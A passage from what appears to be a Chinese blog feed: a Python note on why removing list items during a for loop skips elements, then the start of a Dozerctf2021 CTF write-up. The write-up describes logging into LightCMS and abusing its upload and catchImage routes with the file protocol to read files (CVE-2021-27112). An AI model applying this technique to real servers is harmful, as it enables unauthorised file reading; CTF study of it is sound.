class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>rest<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest1\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>            resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>                <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'C++'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果完成就移出此项</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                time <span class="token operator">-=</span> <span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ntest2\n\n"</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        resttask<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=========="</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 先pop出dict</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""                中间省略            """</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'Java'</span> <span class="token keyword">and</span> time<span class="token punctuation">:</span>  <span class="token comment"># 模拟出错情况</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            time <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span>  <span class="token comment"># 如果出错再给它加回进队列</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"All Done!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span>  <span class="token comment"># 本次选用的测试数据均没有任何主观意见</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test1<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    test2<span class="token punctuation">(</span>getdata<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><hr><p>测试结果如下</p><pre class="language-none"><code class="language-none">&#123;&#39;name&#39;: &#39;C&#39;&#125;&#123;&#39;name&#39;: &#39;C++&#39;&#125;&#123;&#39;name&#39;: &#39;Python&#39;&#125;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;&#123;&#39;name&#39;: &#39;go&#39;&#125;&#123;&#39;name&#39;: &#39;Java&#39;&#125;&#123;&#39;name&#39;: &#39;sql&#39;&#125;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!test2new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：7 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;errornew cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：6 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：5 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：3 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C&#39;, &#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;All Done!</code></pre><hr><h2 id="任务概况"><a href="#任务概况" class="headerlink" title="任务概况"></a>任务概况</h2><p>这个脚本是为了完成某任务，将所有用户存储在一个list里，即</p><pre class="language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"C++"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Python"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"PHP"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"go"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Java"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"solidity"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>对于此任务，中间过程直接省略，有概率(不可定因素)会失败，所以有补错措施。</p><p>假使本任务补错措施完整，不会出现死循环情况。</p><p>对于本测试，模拟出错记录次数time为2次。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nnew cycle!==========\n"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""xxx"""</span></code></pre><p>可见对于list中(下称用户集)的每个dict(下称用户)赋给user，然后进行处理任务(下称任务)，由于<code>while data</code> 必须所有用户全部完成任务才会结束。</p><h4 id="原思想："><a href="#原思想：" class="headerlink" title="原思想："></a>原思想：</h4><p>对于每个用户先全部做一遍任务，然后出错的用户由补错措施补错</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> xxxx<span class="token punctuation">:</span>  <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    data<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user<span class="token punctuation">)</span></code></pre><p>如上，模拟完成任务就从用户集中移出此用户，然后如果有任务出错，用户还在用户集里，输出一行<code>new cycle!==========</code>，继续执行任务。</p><p>然而最终输出却是如下</p><pre class="language-none"><code class="language-none">test1new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：8 个[&#39;C&#39;, &#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C&#39;&#125;剩余任务：7 个[&#39;C++&#39;, &#39;Python&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Python&#39;&#125;剩余任务：6 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;go&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;go&#39;&#125;剩余任务：5 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;sql&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;sql&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：4 个[&#39;C++&#39;, &#39;PHP&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;PHP&#39;&#125;剩余任务：3 个[&#39;C++&#39;, &#39;Java&#39;, &#39;solidity&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;solidity&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;error剩余任务：2 个[&#39;C++&#39;, &#39;Java&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;Java&#39;&#125;new cycle!&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;剩余任务：1 个[&#39;C++&#39;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#123;&#39;name&#39;: &#39;C++&#39;&#125;All Done!</code></pre><p>出现了4次<code>new cycle!==========</code></p><h4 id="实际情况："><a href="#实际情况：" class="headerlink" title="实际情况："></a>实际情况：</h4><p>通过debug，可以看到</p><p>第一次：</p><img src="/article/pythondict/image-20210608170630964.png" class="" title="image-20210608170630964" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170648260.png" class="" title="image-20210608170648260" loading="lazy"><p>这里并没有什么异常，我们过四次看看</p><p>第四次：</p><img src="/article/pythondict/image-20210608170759998.png" class="" title="image-20210608170759998" loading="lazy"><p>移出后：</p><img src="/article/pythondict/image-20210608170807924.png" class="" title="image-20210608170807924" loading="lazy"><p>然后，它竟然跳出了for循环</p><img src="/article/pythondict/image-20210608171051661.png" class="" title="image-20210608171051661" loading="lazy"><p>也就是说<code>for user in data</code>已经走完一遍了</p><p>后面几次同理</p><h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>本人才疏学浅，略有拙见，如有错误还请大佬指正！</p><p>经过考虑，觉得原因如下</p><p>python的变量定义并没有那么严格，凭感觉说，像是一种容器。</p><p><code>for user in data</code>，其实就是user代表元素，而它内部有个隐形指针帮助user取元素，它删掉了元素后，迭代器未同步更新，迭代器最后到达list末尾不会报错，从而异常，我们做个小测试</p><pre class="language-python" data-language="python"><code class="language-python">dictlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> dictlist<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    dictlist<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>i<span class="token punctuation">)</span></code></pre><p>猜猜结果怎么样？</p><details>  <summary>结果如下</summary>{1: 1}{3: 3}{5: 5}{7: 7}</details><p>可见，只输出了单数位</p><p><code>for i in datalist</code>测试<code>datalist</code>里的值</p><p>第一次，即为 <code>datalist[0]</code>（这里不规范地用数组来表示，比较直观）</p><p>有值为{1: 1}，任务进行</p><p>结束后<code>dictlist.remove(i)</code></p><p>此时<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;3: 3&#125;, &#123;4: 4&#125;, &#123;5: 5&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p>第二次为<code>datalist[1]-&gt;&#123;3: 3&#125;</code></p><p>则可以认定，对于dict的remove是即时完成，而i是作为<code>in data</code>的指代，其内部的隐形指针是<code>for(int i=0;i&lt;data.length;i++)</code>的等价代换。(此处的表达并不规范，仅作示意参考)</p><p>当第四次时，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;7: 7&#125;, &#123;8: 8&#125;]</code> </p><p><code>datalist[3]-&gt;&#123;7: 7&#125;</code>，remove it.</p><p>第五次，<code>dictlist-&gt;[&#123;2: 2&#125;, &#123;4: 4&#125;, &#123;6: 6&#125;, &#123;8: 8&#125;]</code></p><p><code>datalist[4]-&gt;NULL</code>跳出了循环</p><img src="/article/pythondict/image-20210608184852589.png" class="" title="image-20210608184852589" loading="lazy"><h5 id="问题缘由"><a href="#问题缘由" class="headerlink" title="问题缘由"></a>问题缘由</h5><p>写了个小脚本，准备按用户顺序处理任务，结果发现并没有按顺序执行，然后输出cycle后，发现按单数执行了第一遍，进一步深究。发现了这个情况。</p><hr><h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>那如果我直接pop出dict呢？</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">while</span> data<span class="token punctuation">:</span>  user <span class="token operator">=</span> data<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="原思想：-1"><a href="#原思想：-1" class="headerlink" title="原思想："></a>原思想：</h4><p>既然for会有越界问题(似乎Python并不觉得这是个问题hhh)，那么如果换种方式呢。</p><p>每次直接pop出一个用户，然后执行任务，如果出错就把这个用户加回用户集</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>  data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span> </code></pre><p>这样一来，确实没啥问题</p><h4 id="实际情况：-1"><a href="#实际情况：-1" class="headerlink" title="实际情况："></a>实际情况：</h4><p>对于本测试，不需要考虑其他因素，而对于撸的那个脚本，一般是不会出错，如果出错应该是一段时间内出错，即无法立刻解决，需要等待（例如这个用户今天不需要执行这个任务，补救达到上限才会执行其他用户任务，会大大拖延脚本的运行速度），这时候如test1先执行其他用户任务即可。</p><p>但在实际脚本中，由于补错措施，程序不写好补错上限就会陷入死循环。</p><h4 id="原因：-1"><a href="#原因：-1" class="headerlink" title="原因："></a>原因：</h4><p>问题在于，pop会弹出用户集最后一个用户，而一旦出现错误，补错措施是将其append回用户集，即还是最后一个用户，这样就会造成死循环</p><p>这里不能用<code>data[&#39;xxx&#39;]=xxx</code>，因为实际dict有很多键值对</p><p>没啥好的根本解决方法，咱不是搞算法和开发的，没有深究这里面的方法，如有方法请师傅们指教。</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后脚本还是test1的方式没有变了，既然Python迭代器没有对其做啥表示，咱也就这样用着就好啦</p><p>这是菜鸡摸鱼撸撸小脚本时候遇到的小情况，也算是一个学习记录吧，还没有系统性地学习Python，可能学到了就会有方法可以解决了吧…</p><hr><h2 id="2021-9-15更新"><a href="#2021-9-15更新" class="headerlink" title="2021.9.15更新"></a>2021.9.15更新</h2><p>和Python老师讨论了一下，<code>for i in data</code>的i其实是元素，用<code>type(i)</code>可以得知，能解释的就是还有隐形指针帮助i取元素，而这个隐形指针对i元素在data的表示有着绝对影响，所以在remove后迭代器未及时更新，导致最后到达了list末尾，迭代器正常工作，迭代器退出，程序结束，未报异常，但没有按照我们想让它执行的样子执行，这就是写代码的逻辑和实际运行逻辑的差异吧…</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dozerctf2021</title>
      <link href="article/dozerctf2021/"/>
      <url>article/dozerctf2021/</url>
      
        <content type="html"><![CDATA[<p>队伍名称：戈戈哥哥不鸽鸽</p><span id="more"></span><p>大师傅们都去打xctf了，几个比赛重时间了，春秋，美团，das。</p><p>在几个比赛中疯狂衔接2333</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="简单域渗透Ⅱ-1"><a href="#简单域渗透Ⅱ-1" class="headerlink" title="简单域渗透Ⅱ-1"></a>简单域渗透Ⅱ-1</h3><p>拿到题Lightcms，直接打。目前网上两个洞，一个v跨站脚本漏洞，一个后台RCE漏洞<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27112">CVE-2021-27112</a></p><p>dozer&#x2F;dozer123登陆后台</p><img src="/article/dozerctf2021/image-20210530221322010.png" class="" title="image-20210530221322010" loading="lazy"><p>在<code>内容管理-&gt;文章-&gt;新建文章内容</code>处上传文件，抓包得到<code>/admin/neditor/serve/uploadimage</code>路由，然后在<code>/admin/neditor/serve/catchImage</code>路由读取文件，网上有很多RCE文章，不多阐述。<code>file_get_contents</code>直接用file协议读取根目录flag，后来flag被改名了，这里算是前期的做法了。</p><img src="/article/dozerctf2021/image-20210530221927944.png" class="" title="image-20210530221927944" loading="lazy"><img 